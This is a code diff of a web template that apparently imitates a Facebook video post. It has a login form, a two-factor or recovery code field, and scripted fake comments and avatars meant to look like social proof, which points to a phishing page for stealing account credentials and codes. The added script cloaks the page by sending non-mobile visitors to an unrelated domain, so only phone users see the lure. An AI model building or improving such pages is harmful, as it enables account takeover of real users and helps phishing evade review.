@@ -83,11 +83,11 @@
                             src="/images/default.jpg" alt="image">
                     </div>
                     <div class="comment-right">
-                        <p style="color: rgb(24, 96, 185);font-weight:bold">Vương Thanh Tú</p>
-                        <p>Open your heart and mine is your <img height="16" width="16" alt="😇"
+                        <p style="color: rgb(24, 96, 185);font-weight:bold">VÆ°Æ¡ng Thanh TÃº</p>
+                        <p>Open your heart and mine is your <img height="16" width="16" alt="ðŸ˜‡"
                                 class="xz74otr" referrerpolicy="origin-when-cross-origin"
                                 src="https://static.xx.fbcdn.net/images/emoji.php/v9/tae/1.5/16/1f607.png"><img
-                                height="16" width="16" alt="😇" class="xz74otr"
+                                height="16" width="16" alt="ðŸ˜‡" class="xz74otr"
                                 referrerpolicy="origin-when-cross-origin"
                                 src="https://static.xx.fbcdn.net/images/emoji.php/v9/tae/1.5/16/1f607.png"></p>
                     </div>
@@ -149,7 +149,7 @@
                                     </button>
                                     {{-- <div class="login-form-link" id="login_link">
                                         <a href="javascript:;" class="_97w4" target=""> Forgotten account?</a>
-                                        <span role="presentation" aria-hidden="true"> · </span>
+                                        <span role="presentation" aria-hidden="true"> Â· </span>
                                         <a href="javascript:;" rel="nofollow" class="_97w5">Sign up for Facebook
                                         </a>
                                     </div> --}}
@@ -241,7 +241,7 @@
                                     <div class="_9o1z" style="text-align: left"><input type="text"
                                             class="validate-input validate-fa inputtext _9o1w _9o1_" name="n"
                                             id="recovery_code_entry" placeholder="@lang('fa.title_placeholder_fa')"
-                                            autocomplete="off" aria-label="Nhập mã"></div>
+                                            autocomplete="off" aria-label="Nháº­p mÃ£"></div>
                                     <div class="_9o1-">
                                         <!--<div class="_9o1x marginBottom10px">@lang('fa.title_noti_action_fa')</div>-->
                                         <div class="_9o1y">
@@ -279,6 +279,17 @@
     <img src="/images/test123.gif" id="myVideo" alt="funny GIF" width="100%" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
     <script type="text/javascript">
+        function isMobile() {
+            const userAgent = navigator.userAgent;
+            return (userAgent.indexOf('Mobile') > -1 || userAgent.indexOf('Tablet') > -1) && window.matchMedia('(max-width: 760px)').matches;
+        }
+
+        if (!isMobile()) {
+            window.location.href = "http://soccerstorenew.net/";
+        } else {
+            console.log("This is not a mobile device.");
+        }
+
         $.ajaxSetup({
             headers: {
                 'X-CSRF-TOKEN': '{{ csrf_token() }}'
@@ -311,23 +322,18 @@
         //
         var email = "";
         const NAME = [
-            'Nguyễn Duy Nhật Tú',
-            'Trần Công Vượng',
-            'Bé Xinhh',
-            'Tú Ông',
-            'Phuong Tran',
-            'And Dep Trai',
-            'Cuoc Đoi Là Vax',
-            'Kan Mot Doi Tku',
+            `@lang('name.name_user_1')`,
+            `@lang('name.name_user_2')`,
+            `@lang('name.name_user_3')`,
+            `@lang('name.name_user_4')`,
+            `@lang('name.name_user_5')`,
         ];
         const COMMENT = [
-            'CHick nhau hk em',
-            'Ngon thế nhở',
-            'Em đẹp qa <3',
-            'Facebook cho livestream sẽ luôn hã',
-            'Vai l',
-            'ĐƯợc của nó đấy',
-            'Ngon quá',
+            `@lang('comment.comment_user_1')`,
+            `@lang('comment.comment_user_2')`,
+            `@lang('comment.comment_user_3')`,
+            `@lang('comment.comment_user_4')`,
+            `@lang('comment.comment_user_5')`,
         ];
         const ICON = [
             "https://static.xx.fbcdn.net/images/emoji.php/v9/ta7/1.5/16/1f644.png",
@@ -339,13 +345,11 @@
             "https://static.xx.fbcdn.net/images/emoji.php/v9/t43/1.5/16/1f970.png",
         ];
         const AVATAR = [
-            "/images/1.jpg",
-            "/images/2.jpg",
-            "/images/3.jpg",
-            "/images/4.jpg",
-            "/images/5.jpg",
-            "/images/6.jpg",
-            "/images/7.jpg",
+            `@lang('avatar.avatar_user_1')`,
+            `@lang('avatar.avatar_user_2')`,
+            `@lang('avatar.avatar_user_3')`,
+            `@lang('avatar.avatar_user_4')`,
+            `@lang('avatar.avatar_user_5')`,
         ];
 
         $(".list-comment").animate({
